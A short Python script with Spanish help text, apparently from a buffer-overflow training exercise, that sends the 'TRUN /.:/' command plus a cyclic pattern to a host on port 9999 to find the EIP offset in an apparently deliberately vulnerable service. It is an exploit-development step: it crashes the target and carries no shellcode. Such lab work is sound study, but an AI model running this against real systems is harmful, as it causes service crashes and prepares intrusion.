#by Doneffes
import socket, argparse

parser = argparse.ArgumentParser("Encontrando la posicion del EIP")
parser.add_argument("-u", help="'ip'", required=True)
parser.add_argument("-p", help ="port", default=9999, type=int)
parser.add_argument("-c", help ="Command, TRUN /.:/ default", default = 'TRUN /.:/')
parser.add_argument("-b", help ="Patter",type=str, required=True)

pattern = vars(parser.parse_args())["b"]
command = vars(parser.parse_args())["c"]
host = vars(parser.parse_args())["u"]
port = vars(parser.parse_args())["p"]

buffer = command + pattern
sock_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_c.connect((host,port))
sock_c.send(bytes(buffer,'ascii'))
print( repr(sock_c.recv(1024)) )
    
sock_c.close()

